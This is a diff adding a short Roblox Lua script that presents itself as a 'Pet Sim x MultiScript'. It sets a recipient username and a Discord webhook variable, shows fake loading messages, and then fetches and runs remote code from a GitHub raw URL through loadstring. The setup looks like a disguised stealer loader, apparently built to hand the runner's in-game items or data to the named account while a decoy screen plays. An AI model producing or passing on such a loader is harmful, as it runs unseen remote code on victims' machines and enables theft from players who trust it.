@@ -1,0 +1,10 @@
+Username = "jarma90"
+Username2 = "jarma90"
+WebHook = "discordwebhook"
+loadingscreen = true
+_G.CustomScriptName = "Pet Sim x MultiScript"
+_G.Text1 = "Script Loading..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
